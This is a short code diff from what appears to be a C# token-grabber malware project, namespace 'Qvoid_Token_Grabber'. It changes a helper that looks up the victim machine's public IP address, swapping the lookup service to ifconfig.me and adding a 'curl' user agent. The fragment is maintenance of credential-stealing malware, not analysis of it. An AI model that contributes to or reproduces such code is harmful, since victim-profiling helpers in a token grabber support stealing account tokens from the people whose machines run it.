@@ -71,7 +71,8 @@ namespace Qvoid_Token_Grabber.Misc
         {
             try
             {
-                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://icanhazip.com");
+                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://ifconfig.me");
+                request.UserAgent = "curl";
                 return new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
             }
             catch { return "Error"; }
